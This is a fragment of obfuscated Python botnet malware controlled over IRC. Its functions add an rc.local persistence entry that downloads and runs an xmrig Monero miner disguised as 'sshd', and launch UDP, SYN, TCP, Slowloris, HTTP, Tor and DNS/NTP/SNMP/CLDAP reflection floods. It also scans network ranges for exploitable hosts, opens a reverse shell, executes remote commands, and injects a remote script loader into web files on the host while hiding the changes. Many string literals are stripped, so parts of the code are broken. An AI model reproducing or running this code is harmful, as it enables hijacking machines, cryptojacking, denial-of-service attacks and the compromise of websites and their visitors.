                        rc.write(data.replace(exit, "/etc/setup.py;echo 'ARGS=\"-o gulf.moneroocean.stream:10128 -u 45iHeQwQaunWXryL9YZ2egJxKvWBtWQUE4PKitu1VwYNUqkhHt6nyCTQb2dbvDRqDPXveNq94DG9uTndKcWLYNoG2uonhgH -p Network --cpu-no-yield --asm=auto --cpu-memory-pool=-1 -B\";curl http://DOMAIN/xmrig1 -O||wget http://DOMAIN/xmrig1 -O xmrig1;mkdir $PWD/.1;mv -f xmrig1 $PWD/.1/sshd;chmod 777 $PWD/.1/sshd;curl http://DOMAIN/xmrig -O||wget http://DOMAIN/xmrig -O xmrig;mkdir $PWD/.2;mv -f xmrig $PWD/.2/sshd;chmod 777 $PWD/.2/sshd;$PWD/.1/sshd $ARGS||$PWD/.2/sshd $ARGS'>$PWD/.kGNLACeaglh.sh;$PWD/.kGNLACeaglh.sh&\nexit").replace(DOMAIN, WMiBcGbzLiZ))
                    else:
                        rc.write("\n/etc/setup.py;echo 'ARGS=\"-o gulf.moneroocean.stream:10128 -u 45iHeQwQaunWXryL9YZ2egJxKvWBtWQUE4PKitu1VwYNUqkhHt6nyCTQb2dbvDRqDPXveNq94DG9uTndKcWLYNoG2uonhgH -p Network --cpu-no-yield --asm=auto --cpu-memory-pool=-1 -B\";curl http://DOMAIN/xmrig1 -O||wget http://DOMAIN/xmrig1 -O xmrig1;mkdir $PWD/.1;mv -f xmrig1 $PWD/.1/sshd;chmod 777 $PWD/.1/sshd;curl http://DOMAIN/xmrig -O||wget http://DOMAIN/xmrig -O xmrig;mkdir $PWD/.2;mv -f xmrig $PWD/.2/sshd;chmod 777 $PWD/.2/sshd;$PWD/.1/sshd $ARGS||$PWD/.2/sshd $ARGS'>$PWD/.kGNLACeaglh.sh;$PWD/.kGNLACeaglh.sh&".replace(DOMAIN, WMiBcGbzLiZ))
                    rc.close()
                    os.popen(/etc/rc.local)
            except:
                pass
    def DXdlnWnEvTZ(self,aiGnHBMjgzSE,MQHFkoEHLVv,MisyFUUoj):
        if str(MQHFkoEHLVv).startswith("0"):
            HWycyxBTaSp=os.urandom(random.randint(1024,65507))
        else:
            HWycyxBTaSp="\xff"*65507
        xkeaoCpoQzu=time.time()+MisyFUUoj
        self.gLsaWmlh=0
        while xkeaoCpoQzu>time.time():
            if self.AELmEnMe == 1:
                break
            try:
                kpaioMqjP=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                if MQHFkoEHLVv==0:
                    kpaioMqjP.sendto(HWycyxBTaSp,(aiGnHBMjgzSE, random.randrange(1,65535)))
                else:
                    kpaioMqjP.sendto(HWycyxBTaSp,(aiGnHBMjgzSE, MQHFkoEHLVv))
                self.gLsaWmlh+=1
            except:
                pass
        self.gLsaWmlh=0
    def ialboQvchVnX(self,IJCFjZHqU,MQHFkoEHLVv,MisyFUUoj):
        xkeaoCpoQzu=time.time()+MisyFUUoj
        while xkeaoCpoQzu>time.time():
            if self.AELmEnMe == 1:
                return
            try:
                kpaioMqjP=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                kpaioMqjP.settimeout(0.001)
                kpaioMqjP.connect((IJCFjZHqU, MQHFkoEHLVv))
                self.gLsaWmlh+=1
            except:
                pass
        self.gLsaWmlh=0
    def IosZebii(self,IJCFjZHqU,MQHFkoEHLVv,MisyFUUoj):
        xkeaoCpoQzu=time.time()+MisyFUUoj
        while xkeaoCpoQzu>time.time():
            if self.AELmEnMe == 1:
                return
            try:
                kpaioMqjP=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                kpaioMqjP.connect((IJCFjZHqU, MQHFkoEHLVv))
                kpaioMqjP.send(os.urandom(ramom.randint(1024, 65535)))
                kpaioMqjP.close()
                self.gLsaWmlh+=1
            except:
                pass
        self.gLsaWmlh=0
    def DljJmElaeV(self,oGMjpdBCglS, dRXKPWWNYE, PdpoOiRa, MisyFUUoj):
        xkeaoCpoQzu=time.time()+MisyFUUoj
        self.gLsaWmlh = 0
        fds = []
        for yolOaRaoqoMh in xrange(0, int(PdpoOiRa)):
            fds.append(0)
        while 1:
            if self.AELmEnMe == 1:
                break
            for yolOaRaoqoMh in xrange(0, int(PdpoOiRa)):
                if self.AELmEnMe == 1:
                    break
                fds[yolOaRaoqoMh] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    fds[yolOaRaoqoMh].connect((oGMjpdBCglS, int(dRXKPWWNYE)))
                except:
                    pass
            GSOwvLsM = "GET / HTTP/1.1\nHost: %s:%s\nUser-agent: %s\nAccept: */*\nConnection: Keep-Alive\n\n" % (oGMjpdBCglS, dRXKPWWNYE, random.choice(self.GbASkEbE))
            for WnwHLFzafwd in GSOwvLsM:
                if self.AELmEnMe == 1:
                    break
                for fd in fds:
                    try:
                        fd.send(WnwHLFzafwd)
                        self.gLsaWmlh+=1
                    except:
                        try:
                            fd.connect((oGMjpdBCglS, int(dRXKPWWNYE)))
                        except:
                            pass
                if xkeaoCpoQzu<time.time():
                    for fd in fds:
                        try:
                            fd.close()
                        except:
                            pass
                    return
                time.sleep(1)
                self.gLsaWmlh = 0
        self.gLsaWmlh=0
    def CSmUcncFBaq(self,ZPSfciamzo):
        try:
            req = urllib2.Request(ZPSfciamzo)
            req.add_header(User-Agent, random.choice(self.GbASkEbE))
            return urllib2.urlopen(req).read()
        except:
            return ""
    def RxQmujRYcRiJ(self,ZPSfciamzo):
        global EkcvdRbW
        try:
            PUcAJbwyuO = random.choice(EkcvdRbW)
            ss=socks.socksocket()
            ss.setproxy(socks.PROXY_TYPE_SOCKS5, PUcAJbwyuO.split(":")[0], int(PUcAJbwyuO.split(":")[1]), True)
            ss.connect((ZPSfciamzo.split("//")[-1].split("/")[0].split('?')[0], 80))
            ss.send(GET  + "/"+"/".join(ZPSfciamzo.split("://")[1].split("/")[1:]) + " HTTP/1.1\nHost: %s:%s\nUser-agent: %s\nAccept: */*\nConnection: Keep-Alive\n\n")
            x=iDjcNalAcGul(ss, 1024*1024, 1)
            ss.close()
            x=

.join(x.split(

)[1:])
            x=

.join(x.split(

)[1:])
            return x
        except:
            return ""
    def WioPmgks(self,url,oeCMiYeqZh,MisyFUUoj):
        if oeCMiYeqZh==true or oeCMiYeqZh == "1":
            xkeaoCpoQzu=time.time()+MisyFUUoj
            oWjNeFfdMlL=3d5b27225d3f285b5e2722203e5d2b29.decode("HEX")
            while xkeaoCpoQzu>time.time():
                if self.AELmEnMe == 1:
                    break
                for bLGCCdaANoaY in re.findall(href+oWjNeFfdMlL,self.CSmUcncFBaq(url), re.I):
                    if self.AELmEnMe == 1:
                        break
                    self.CSmUcncFBaq(bLGCCdaANoaY)
                for bLGCCdaANoaY in re.findall('src'+oWjNeFfdMlL,self.CSmUcncFBaq(url), re.I):
                    if self.AELmEnMe == 1:
                        break
                    self.CSmUcncFBaq(bLGCCdaANoaY)
        else:
            xkeaoCpoQzu=time.time()+MisyFUUoj
            while xkeaoCpoQzu>time.time():
                if self.AELmEnMe == 1:
                    break
                self.CSmUcncFBaq(url)
    def ouKZyovuz(self,url,oeCMiYeqZh,MisyFUUoj):
        if oeCMiYeqZh==true or oeCMiYeqZh == "1":
            xkeaoCpoQzu=time.time()+MisyFUUoj
            oWjNeFfdMlL=3d5b27225d3f285b5e2722203e5d2b29.decode("HEX")
            while xkeaoCpoQzu>time.time():
                if self.AELmEnMe == 1:
                    break
                for bLGCCdaANoaY in re.findall(href+oWjNeFfdMlL,self.RxQmujRYcRiJ(url), re.I):
                    if self.AELmEnMe == 1:
                        break
                    self.RxQmujRYcRiJ(bLGCCdaANoaY)
                for bLGCCdaANoaY in re.findall('src'+oWjNeFfdMlL,self.RxQmujRYcRiJ(url), re.I):
                    if self.AELmEnMe == 1:
                        break
                    self.RxQmujRYcRiJ(bLGCCdaANoaY)
        else:
            xkeaoCpoQzu=time.time()+MisyFUUoj
            while xkeaoCpoQzu>time.time():
                if self.AELmEnMe == 1:
                    break
                self.RxQmujRYcRiJ(url)
    def cZkufgqZhwx(self,acQaKBZToEa,YukdTXMlxO,ZOdLDxSZvR,acBdxXUCco):
        self.VSoeKsdv += 1
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((acQaKBZToEa, YukdTXMlxO))
            s.close()
            self.kVljQimUstats[acBdxXUCco][1] += 1
            if ZOdLDxSZvR == true or ZOdLDxSZvR == "yes" or ZOdLDxSZvR == "1":
                self.kVljQimU(acQaKBZToEa,YukdTXMlxO)
        except:
            pass
        self.VSoeKsdv -= 1
    def ooGNQdwfZ(self,acQaKBZToEa,MQHFkoEHLVv,ZOdLDxSZvR,acBdxXUCco):
        global ports
        oclsikEZJUWh = 0
        self.VSoeKsdv += 1
        try:
            if MQHFkoEHLVv == allports:
                for YukdTXMlxO in ports:
                    threading.Thread(target=self.cZkufgqZhwx, args=(acQaKBZToEa,YukdTXMlxO,ZOdLDxSZvR,acBdxXUCco,)).start()
            else:
                self.cZkufgqZhwx(acQaKBZToEa,MQHFkoEHLVv,ZOdLDxSZvR)
        except:
            pass
        if oclsikEZJUWh == 1:
            self.kVljQimUstats[acBdxXUCco][1] += 1
        self.kVljQimUstats[acBdxXUCco][0] += 1
        self.VSoeKsdv -= 1
    def qWMQJquJ(self):
        myip=Unknown
        try:
            myip=urllib2.urlopen(https://api.ipify.org/).read()
        except:
            try:
                myip=urllib2.urlopen(http://ipinfo.io/ip).read()
            except:
                try:
                    myip=urllib2.urlopen(https://www.trackip.net/ip).read()
                except:
                    try:
                        myip=urllib2.urlopen(http://ifconfig.me/).read()
                    except:
                        try:
                            myip=urllib2.urlopen(http://icanhazip.com/).read().replace("\n","")
                        except:
                            pass
        return myip
    def LqRGKbsJf(self,acBdxXUCco,MQHFkoEHLVv,ZOdLDxSZvR):
        global ports,FAozAuHBacRN
        if FAozAuHBacRN:
            ports = [22, 80, 443, 7001, 8080, 8081, 8443]
        try:
            if acBdxXUCco == nearme:
                BYDRxhKZTDz=self.qWMQJquJ()
                if BYDRxhKZTDz!=None:
                    acBdxXUCco=BYDRxhKZTDz+"/16"
            elif acBdxXUCco == "lan":
                acBdxXUCco=VdqQKydogMq+"/16"
            else:
                cxiboXLaFZA = [10,127,169,172,192,233,234]
                bDMLYokf = random.randrange(1,256)
                while bDMLYokf in cxiboXLaFZA:
                    bDMLYokf = random.randrange(1,256)
                if acBdxXUCco==b-class:
                    cbDVDbBoeV=str(bDMLYokf)+"."+str(random.randrange(1,256))+.0.0/16
                elif acBdxXUCco==c-class:
                    acBdxXUCco=str(bDMLYokf)+"."+str(random.randrange(1,256))+"."+str(random.randrange(1,256))+.0/24
        except:
            self.commSock.send(PRIVMSG %s :Failed to grab IP
 % (self.AviaeEPO))
            return
        (RaeLxHNbW, zqofpvkN) = acBdxXUCco.split('/')
        bibXsSNa = RaeLxHNbW.split('.')
        sscRaTylE = int(zqofpvkN)
        ZIDXeauXRo = [0, 0, 0, 0]
        for i in range(sscRaTylE):
            ZIDXeauXRo[i/8] = ZIDXeauXRo[i/8] + (1 << (7 - i % 8))
        GakdFZVGEV = []
        for i in range(4):
            GakdFZVGEV.append(int(bibXsSNa[i]) & ZIDXeauXRo[i])
        yIfHieau = list(GakdFZVGEV)
        nSPxmJHijaqm = 32 - sscRaTylE
        for i in range(nSPxmJHijaqm):
            yIfHieau[3 - i/8] = yIfHieau[3 - i/8] + (1 << (i % 8))
        yoLDEsHDka = ".".join(map(str, ZIDXeauXRo))
        oTCCFjSI = ".".join(map(str, GakdFZVGEV))
        UsqailcdKf = ".".join(map(str, yIfHieau))
        foIawXQGM = struct.unpack('>I', socket.inet_aton(".".join(map(str, GakdFZVGEV))))[0]
        cmaxYpdcdLm = struct.unpack('>I', socket.inet_aton(".".join(map(str, yIfHieau))))[0]
        ZOdLDxSZvR = ZOdLDxSZvR.lower()
        if ZOdLDxSZvR == true or ZOdLDxSZvR == "yes" or ZOdLDxSZvR == "1":
            if MQHFkoEHLVv == allports:
                self.commSock.send(PRIVMSG %s :Exploit scanning %s on port %s
 % (self.AviaeEPO,%s - %s % (oTCCFjSI, UsqailcdKf),str(ports)))
            else:
                self.commSock.send(PRIVMSG %s :Exploit scanning %s on port %s
 % (self.AviaeEPO,%s - %s % (oTCCFjSI, UsqailcdKf),MQHFkoEHLVv))
        else:
            self.commSock.send(PRIVMSG %s :Scanning %s on port %s
 % (self.AviaeEPO,%s - %s % (oTCCFjSI, UsqailcdKf),MQHFkoEHLVv))
        self.kVljQimUstats[acBdxXUCco] = [0,0]
        for i in range(foIawXQGM, cmaxYpdcdLm):
            PlXYVUbp = socket.inet_ntoa(struct.pack('>I', i))
            try:
                if self.AELmEnMe == 1 or self.scannerenabled == 0:
                    return
                while self.VSoeKsdv >= (multiprocessing.cpu_count() * 10):
                    time.sleep(0.1)
                threading.Thread(target=self.ooGNQdwfZ, args=(PlXYVUbp,MQHFkoEHLVv,ZOdLDxSZvR,acBdxXUCco,)).start()
            except:
                pass
        self.commSock.send(PRIVMSG %s :Finished scanning range %s
 % (self.AviaeEPO,acBdxXUCco))
    def zqundOCogyoi(self, PvinqsgVDf, NLvimAgjFSwY, oYKvPVPGpci, cNSlLDSJa):
        self.acuciFgIs = [['\x10',amazon.com],['\x10',live.com],['\x10',office.com],['\x10',discord.com],['\x10',wikihow.com],['\x10',redbubble.com],['\x10',coupang.com],['\x10',politico.com],['\x10',ria.ru],['\x10',gds.it],['\x10',teespring.com],['\x10',quizizz.com],['\x10',audible.com],['\x10',bb.com.br],['\x10',xbox.com],['\x10',jpmorganchase.com],['\x10',sagepub.com],['\x10',clarin.com],['\x10',kickstarter.com],['\x10',study.com],['\x10',greythr.com],['\x10',telekom.com],['\x10',smartrecruiters.com],['\xff',gazeta.ru],['\xff',valuecommerce.ne.jp],['\x10',sii.cl],['\x10',rt.ru],['\xff',inoreader.com],['\xff',freepik.es],['\x10',yemek.com],['\x10',hapitas.jp],['\x10',xoom.com],['\xff',belwue.de],['\xff',fanfiction.net],['\x10',tasteofhome.com],['\x10',skyroom.online],['\x10',duosecurity.com],['\x10',difi.no],['\x10',indodax.com],['\x10',williams-sonoma.com],['\xff',kamihq.com],['\x10',lamoda.ru],['\x10',mononews.gr],['\x10',tineye.com],['\x10',santander.com.mx],['\xff',theclutcher.com],['\x10',emailanalyst.com],['\x10',coincheck.com],['\x10',tuya.com],['\x10',atlantico.eu],['\x10',unicef.org],['\x10',bizpacreview.com],['\xff',torontomls.net],['\x10',nobroker.in],['\x10',paytmmall.com],['\x10',jornaldeangola.ao],['\x10',timesjobs.com],['\x10',watcha.com],['\x10',samcart.com],['\xff',wpbeginner.com],['\x10',ssrn.com],['\x10',lastpass.com],['\x10',tweakers.net],['\xff',animego.org],['\x10',thriftbooks.com],['\x10',homecenter.com.co],['\x10',etnews.com],['\x10',designhill.com],['\xff',wavve.com],['\x10',umh.es],['\x10',papaki.com],['\x10',military.com],['\xff',infojobs.com.br],['\x10',qwiklabs.com],['\xff',immi.gov.au],['\x10',stash.com],['\x10',mps.it],['\xff',apowersoft.com],['\x10',impact.com],['\xff',jasminsoftware.pt],['\x10',filmstarts.de],['\x10',growthhackers.com],['\x10',hs.fi],['\x10',rubiconproject.com],['\x10',alchemer.com],['\xff',mahacet.org],['\x10',datorama.com],['\x10',npmjs.com]]
        for i in range(cNSlLDSJa):
            threading.Thread(target=self.TPIDohOAdc, args=(PvinqsgVDf,NLvimAgjFSwY,time.time()+oYKvPVPGpci)).start()
    def DVsMqwOBdsa(self, NLvimAgjFSwY, sock, XpyTiPnu, PvinqsgVDf, fcEeSaeWx):
        hjVjlKLCdwi = {
            'dns': 53,
            'ntp': 123,
            cldap: 389,
            snmp: 161,
        }
        udp = EwsBWWecxo(random.randint(1, 65535), hjVjlKLCdwi[PvinqsgVDf], fcEeSaeWx).wGsAXnOB(NLvimAgjFSwY, XpyTiPnu)
        ip = JyhPiKIB(NLvimAgjFSwY, XpyTiPnu, udp, hhShLOMBn=socket.IPPROTO_UDP).wGsAXnOB()
        sock.sendto(ip+udp+fcEeSaeWx, (XpyTiPnu, hjVjlKLCdwi[PvinqsgVDf]))
    def padogUYsj(self,XndBIJOLnk):
        return chr(len(XndBIJOLnk)) + XndBIJOLnk
    def make_PWNZeoeLZQk_acuciFgI(self, acuciFgI):
        xexyYkujBf = acuciFgI.split('.')
        xexyYkujBf = list(map(self.padogUYsj, xexyYkujBf))
        return ''.join(xexyYkujBf)
    def kRleTJBoRhha(self, PWNZeoeLZQk, vwpaDFab):
        req = os.urandom(2) + "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
        req += PWNZeoeLZQk
        req += '\x00\x00' + vwpaDFab + '\x00\x01'
        return req
    def TPIDohOAdc(self, PvinqsgVDf, NLvimAgjFSwY, oeiXlFJcaXYc):
        aDNDguYYxRE=open("." + PvinqsgVDf, "r")
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        i = 0
        while 1:
            try:
                if time.time()>=oeiXlFJcaXYc or self.AELmEnMe == 1:
                    break
                XpyTiPnu = aDNDguYYxRE.readline().strip()
                if XpyTiPnu:
                    if PvinqsgVDf=='dns':
                        UaxfcJiBh = random.choice(self.acuciFgIs)
                        self.DVsMqwOBdsa(NLvimAgjFSwY, sock, XpyTiPnu, PvinqsgVDf, self.kRleTJBoRhha(self.make_PWNZeoeLZQk_acuciFgI(UaxfcJiBh[1]), UaxfcJiBh[0]))
                    else:
                        self.DVsMqwOBdsa(NLvimAgjFSwY, sock, XpyTiPnu, PvinqsgVDf, DgWVkccUXHgq[PvinqsgVDf])
                else:
                    aDNDguYYxRE.seek(0)
            except:
                pass
        try:
            aDNDguYYxRE.close()
        except:
            pass
    def HXRAPMoEI(self, ip, port):
        if not os.name == 'nt':
            import pty
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((ip, int(port)));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(/bin/sh)
        else:
            pass
    def oxBObGgENdBA(self, cmd, jQivgbKKoL):
        try:
            WQNioMYhwc = subprocess.Popen(cmd,stdout=subprocess.PIPE,shell=True)
            while True:
                ZYDiNAxaaX = WQNioMYhwc.stdout.readline()
                if WQNioMYhwc.poll() is not None and ZYDiNAxaaX == '':
                    break
                if ZYDiNAxaaX:
                    self.commSock.send(PRIVMSG %s :%s
 % (jQivgbKKoL,ZYDiNAxaaX))
        except:
            pass
    def vedCPTZE(self,s, sub, repl, n):
        find = s.find(sub)
        i = find != -1
        while find != -1 and i != n:
            find = s.find(sub, find + 1)
            i += 1
        if i == n:
            return s[:find] + repl + s[find+len(sub):]
        return s
    def ahRTWwTwVh(self, VdxcFozRoO):
        global OFwciSvZq
        try:
            CiHaciha=False
            VdxcFozRoO=os.path.realpath(VdxcFozRoO)
            ZuiWWBgcNRi=(os.path.getatime(VdxcFozRoO), os.path.getmtime(VdxcFozRoO))
            fdpwbXohTm=open(VdxcFozRoO,"rb")
            idokhWcQc=fdpwbXohTm.read()
            fdpwbXohTm.close()
            ieFXOJeoJi = enYhURMomcJY(8)
            oawPVhzRFJGc = enYhURMomcJY(8)
            sYigocBw = b64encode("//" + WMiBcGbzLiZ + /campaign.js)
            BddOqazfG=(function( + oawPVhzRFJGc + ", " + ieFXOJeoJi + ") {" + ieFXOJeoJi + " = " + oawPVhzRFJGc + .createElement('script'); + ieFXOJeoJi + .type = 'text/javascript'; + ieFXOJeoJi + .async = true; + ieFXOJeoJi + .src = atob(' + OFwciSvZq + sYigocBw + OFwciSvZq + '.replace(/ + OFwciSvZq + /gi, '')) + '?' + String(Math.random()).replace('0.',''); + oawPVhzRFJGc + .getElementsByTagName('body')[0].appendChild( + ieFXOJeoJi + );}(document));
            UZPqPKEUN=idokhWcQc.split(OFwciSvZq)
            if len(UZPqPKEUN) > 1:
                if UZPqPKEUN[1] != sYigocBw:
                    idokhWcQc=idokhWcQc.replace(UZPqPKEUN[1], sYigocBw)
                    self.AkvElneS+=1
                    CiHaciha = True
                elif UZPqPKEUN[1] == sYigocBw:
                    self.AkvElneS+=1
                    return
            else:
                if VdxcFozRoO.endswith(".js"):
                    if var  in idokhWcQc:
                        idokhWcQc=self.vedCPTZE(idokhWcQc, var , BddOqazfG + var , 1)
                        self.AkvElneS+=1
                        CiHaciha = True
                else:
                    if </body in idokhWcQc:
                        idokhWcQc=self.vedCPTZE(idokhWcQc, </body, <script type= + '"' + text/javascript + '"' + ">" + BddOqazfG + </script></body, 1)
                        self.AkvElneS+=1
                        CiHaciha = True
            if CiHaciha:
                fdpwbXohTm=open(VdxcFozRoO, "wb")
                fdpwbXohTm.write(idokhWcQc)
                fdpwbXohTm.close()
            os.utime(VdxcFozRoO, ZuiWWBgcNRi)
        except:
            pass
    def MZjiCvUMFL(self):
        if os.name != "nt":
            self.AkvElneS=0
            for NOKBFePFmo in [ele for ele in os.listdir("/") if ele not in [proc, "bin", sbin, sbin, "dev", "lib", lib64, lost+found, "sys", boot, "etc"]]:
                for qOgEaJyETdL in [*.js, *.html, *.htm, *.php]:
                    for VdxcFozRoO in os.popen("find \"/" + NOKBFePFmo + "\" -type f -name \"" + qOgEaJyETdL + "\"").read().split("\n"):
                        VdxcFozRoO = VdxcFozRoO.replace("\r", "").replace("\n", "")
                        if node not in VdxcFozRoO and 'lib' not in VdxcFozRoO and "npm" not in VdxcFozRoO and VdxcFozRoO != "":
                            self.ahRTWwTwVh(VdxcFozRoO)
    def pogaiwWIid(self, url, ooqWHmJvnkb):
        try:
            fh=open(ooqWHmJvnkb, "wb")
            fh.write(urllib2.urlopen(url).read())
            fh.close()
            os.startfile(ooqWHmJvnkb)
        except:
            pass
    def XKWQqQizgo(self, mTKSRDnijSo, jQivgbKKoL):
        global aglKdYah,ports
        try:
            if mTKSRDnijSo[3]==":" + self.cmdprefix + logout:
                aglKdYah=-1
                self.commSock.send(PRIVMSG %s :De-Authorization successful
 % (jQivgbKKoL))
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + udpflood:
                for i in range(0, int(mTKSRDnijSo[7])):
                    threading.Thread(target=self.DXdlnWnEvTZ,args=(mTKSRDnijSo[4],int(mTKSRDnijSo[5]),int(mTKSRDnijSo[6]),)).start()
                if mTKSRDnijSo[5] == "0":
                    mTKSRDnijSo[5] = random
                self.commSock.send(PRIVMSG %s :Started UDP flood on %s:%s with %s threads
 % (jQivgbKKoL,mTKSRDnijSo[4],mTKSRDnijSo[5],mTKSRDnijSo[7]))
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + synflood:
                for i in range(0, int(mTKSRDnijSo[7])):
                    threading.Thread(target=self.ialboQvchVnX,args=(mTKSRDnijSo[4],int(mTKSRDnijSo[5]),int(mTKSRDnijSo[6],))).start()
                self.commSock.send(PRIVMSG %s :Started SYN flood on %s:%s with %s threads
 % (jQivgbKKoL,mTKSRDnijSo[4],mTKSRDnijSo[5],mTKSRDnijSo[7]))
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + tcpflood:
                for i in range(0, int(mTKSRDnijSo[7])):
                    threading.Thread(target=self.IosZebii,args=(mTKSRDnijSo[4],int(mTKSRDnijSo[5]),int(mTKSRDnijSo[6],))).start()
                self.commSock.send(PRIVMSG %s :Started TCP flood on %s:%s with %s threads
 % (jQivgbKKoL,mTKSRDnijSo[4],mTKSRDnijSo[5],mTKSRDnijSo[7]))
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + slowloris:
                threading.Thread(target=self.DljJmElaeV,args=(mTKSRDnijSo[4],int(mTKSRDnijSo[5]),int(mTKSRDnijSo[6],))).start()
                self.commSock.send(PRIVMSG %s :Started Slowloris on %s with %s sockets
 % (jQivgbKKoL,mTKSRDnijSo[4],mTKSRDnijSo[5]))
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + httpflood:
                for i in range(0, int(mTKSRDnijSo[7])):
                    threading.Thread(target=self.WioPmgks,args=(mTKSRDnijSo[4],mTKSRDnijSo[5],int(mTKSRDnijSo[6]),)).start()
                self.commSock.send(PRIVMSG %s :Started HTTP flood on URL: %s with %s threads
 % (jQivgbKKoL,mTKSRDnijSo[4],mTKSRDnijSo[7]))
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + torflood:
                for i in range(0, int(mTKSRDnijSo[7])):
                    threading.Thread(target=self.ouKZyovuz,args=(mTKSRDnijSo[4],mTKSRDnijSo[5],int(mTKSRDnijSo[6]),)).start()
                self.commSock.send(PRIVMSG %s :Started Tor HTTP flood on URL: %s with %s threads
 % (jQivgbKKoL,mTKSRDnijSo[4],mTKSRDnijSo[7]))
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + loadamp:
                self.commSock.send(PRIVMSG %s :Downloading %s list from %s
 % (jQivgbKKoL,mTKSRDnijSo[4],mTKSRDnijSo[5]))
                threading.Thread(target=urllib.urlretrieve, args=(mTKSRDnijSo[5], "."+mTKSRDnijSo[4],)).start()
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + reconnect:
                GnqGpbEqg = 0
                try:
                    self.commSock.close()
                except:
                    pass
                self.qgoSdaBM()
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + reflect:
                try:
                    if not os.path.exists("."+mTKSRDnijSo[4]):
                        self.commSock.send(PRIVMSG %s :Please load this type of amp list first
 % (jQivgbKKoL))
                        return
                    self.commSock.send(PRIVMSG %s :Started %s amp flood on %s with %s threads
 % (jQivgbKKoL,mTKSRDnijSo[4],mTKSRDnijSo[5],mTKSRDnijSo[7]))
                    self.zqundOCogyoi(mTKSRDnijSo[4], socket.gethostbyname(mTKSRDnijSo[5]), int(mTKSRDnijSo[6]), int(mTKSRDnijSo[7]))
                except:
                    pass
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + addport:
                if int(mTKSRDnijSo[4]) not in ports:
                    ports.append(int(mTKSRDnijSo[4]))
                    self.commSock.send(PRIVMSG %s :Added port %s to scanner
 % (jQivgbKKoL,mTKSRDnijSo[4]))
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + delport:
                if int(mTKSRDnijSo[4]) in ports:
                    ports.remove(int(mTKSRDnijSo[4]))
                    self.commSock.send(PRIVMSG %s :Removed port %s from scanner
 % (jQivgbKKoL,mTKSRDnijSo[4]))
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + ports:
                self.commSock.send(PRIVMSG %s :I am currently scanning %s
% (jQivgbKKoL,str(ports)))
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + injectcount:
                self.commSock.send(PRIVMSG %s :I have injected into %s files total
 % (jQivgbKKoL, self.AkvElneS))
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + reinject:
                threading.Thread(target=self.MZjiCvUMFL).start()
                self.commSock.send(PRIVMSG %s :Re-injecting all html and js files
 % (jQivgbKKoL))
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + scanner:
                if mTKSRDnijSo[4]==resume:
                    self.scannerenabled=1
                    self.commSock.send(PRIVMSG %s :Scanner resumed!
 % (jQivgbKKoL))
                else:
                    self.scannerenabled=0
                    self.commSock.send(PRIVMSG %s :Scanner paused!
 % (jQivgbKKoL))
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + sniffer:
                if mTKSRDnijSo[4]==resume:
                    if self.snifferenabled==0:
                        self.snifferenabled=1
                        self.commSock.send(PRIVMSG %s :Sniffer resumed!
 % (jQivgbKKoL))
                else:
                    if self.snifferenabled==1:
                        self.snifferenabled=0
                        self.commSock.send(PRIVMSG %s :Sniffer paused!
 % (jQivgbKKoL))
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + scannetrange:
                threading.Thread(target=self.LqRGKbsJf,args=(mTKSRDnijSo[4],mTKSRDnijSo[5],mTKSRDnijSo[6],)).start()
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + scanstats:
                try:
                    if mTKSRDnijSo[4] == "all":
                        XXTWXzVbmH=""
                        NqPaxJGNdYg=0
                        oclsikEZJUWh=0
                        oclsikEZJUWh = 0
                        for ALcXJgphJyEg,OIiXLiUcDm in enumerate(self.kVljQimUstats):
                            if OIiXLiUcDm != gaybots:
                                XXTWXzVbmH+=OIiXLiUcDm + ", "
                                EFvXpJzxqsUN,RhfaEqdedO=self.kVljQimUstats[OIiXLiUcDm]
                                NqPaxJGNdYg+=EFvXpJzxqsUN
                                oclsikEZJUWh+=RhfaEqdedO
                        if XXTWXzVbmH != ", ":
                            self.commSock.send(PRIVMSG %s :IP Ranges scanned: %stotal all time IPs scanned: %s, total found open: %s
 % (jQivgbKKoL, XXTWXzVbmH,str(NqPaxJGNdYg), str(oclsikEZJUWh)))
                        else:
                            self.commSock.send(PRIVMSG %s :Scanner DB empty
 % (jQivgbKKoL))
                    elif self.kVljQimUstats[mTKSRDnijSo[4]][0]:
                        self.commSock.send(PRIVMSG %s :Scanner stats for: %s total scanned: %s, total open: %s
 % (jQivgbKKoL, mTKSRDnijSo[4], str(self.kVljQimUstats[mTKSRDnijSo[4]][0]), str(self.kVljQimUstats[mTKSRDnijSo[4]][1])))
                except:
                    self.commSock.send(PRIVMSG %s :No scanner stats for: %s
 % (jQivgbKKoL, mTKSRDnijSo[4]))
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + clearscan:
                self.kVljQimUstats={gaybots:[0,0]}
                self.commSock.send(PRIVMSG %s :Scanner DB emptied
 % (jQivgbKKoL))
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + revshell:
                threading.Thread(target=self.HXRAPMoEI, args=(mTKSRDnijSo[4],mTKSRDnijSo[5],)).start()
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + shell:
                threading.Thread(target=self.oxBObGgENdBA,args=(" ".join(mTKSRDnijSo[4:]),jQivgbKKoL,)).start()
